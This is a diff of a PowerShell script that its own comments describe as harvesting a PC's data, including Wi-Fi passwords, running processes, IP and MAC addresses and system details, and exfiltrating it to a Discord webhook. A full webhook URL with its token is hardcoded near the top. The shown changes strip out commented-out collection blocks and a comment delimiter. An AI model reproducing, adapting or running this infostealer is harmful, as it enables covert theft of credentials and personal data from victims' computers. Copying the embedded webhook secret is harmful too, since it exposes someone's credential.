@@ -4,7 +4,6 @@
 	#This program gathers details from PC to include everything you could imagine from wifi passwords to PC specs to every process running
 	#All of the gathered information is formatted neatly and output to a file 
 	#That file is then exfiltrated to Discord Webhook
-#>
 ##########################
 # Configuration Variables
 $DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"
@@ -105,7 +104,6 @@ try {
 try {
     #$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
     $computerPubIP = curl ipinfo.io/ip
-    #testing this ^^
     $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
     $localIP = $computerIPs -join ", "
     $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
@@ -117,17 +115,7 @@ try {
     #$IsDHCPEnabled = $false
 }
 
-# **Step 2: Active Connections and Listeners**
-<#try {
-    $activeConnections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
-    $ConnectionsInfo = ($activeConnections | Out-String)
-} catch {
-    $ConnectionsInfo = "Failed to retrieve active TCP connections."
-}#>
-##########################
-# Get System Information: Print System Details to Console
 Write-Host "Building System Details..."
-
 # System Info Retrieval (Updated)
 try {
     $hostname = $env:COMPUTERNAME
@@ -158,53 +146,7 @@ Public IP: $publicIP
 
 # Output or Send via Discord Webhook
 Write-Output $systemInfo
-
-# Get System Info
-<#try {
-    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
-    #$computerOS = Get-WmiObject -Class Win32_OperatingSystem
-    $osInfo = [System.Environment]::OSVersion.VersionString
-    $computerCPU = Get-WmiObject -Class Win32_Processor
-    $computerBIOS = Get-WmiObject -Class Win32_BIOS
-    $computerRAM = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
-
-    $SystemDetails = @"
-System Manufacturer: $($computerSystem.Manufacturer)
-System Model: $($computerSystem.Model)
-BIOS Serial Number: $($computerBIOS.SerialNumber)
-Operating System: $($computerOS.Caption)
-OS Version: $($computerOS.Version)
-OS Serial Number: $($computerOS.SerialNumber)
-Install Date: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.InstallDate))
-Last Boot Time: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.LastBootUpTime))
-CPU: $($computerCPU.Name)
-RAM Capacity: $([Math]::Round($computerRAM / 1GB, 2)) GB
-"@
-} catch {
-    $SystemDetails = "Error: Unable to retrieve system details. Exception: $($_.Exception.Message)"
-}
-# Main Script: Construct Full System Information
-$SystemInfo = @"
-User: $FullName
-Email: $Email
-Hostname: $HostName
-Public IP: $computerPubIP
-Local IP(s): $localIP
-MAC Address: $MAC
-DHCP Enabled: $IsDHCPEnabled 
-System Details:
-$SystemDetails
-Wi-Fi Passwords:
-$WiFiPasswords
-Active TCP Connections:
-$ConnectionsInfo
-"@
-# Debug: Output Full System Info to Console
-Write-Host "Full System Info:" $SystemInfo
-#>
-
 ##########################
-
 # Get HDDs
 $driveType = @{
    2="Removable disk "
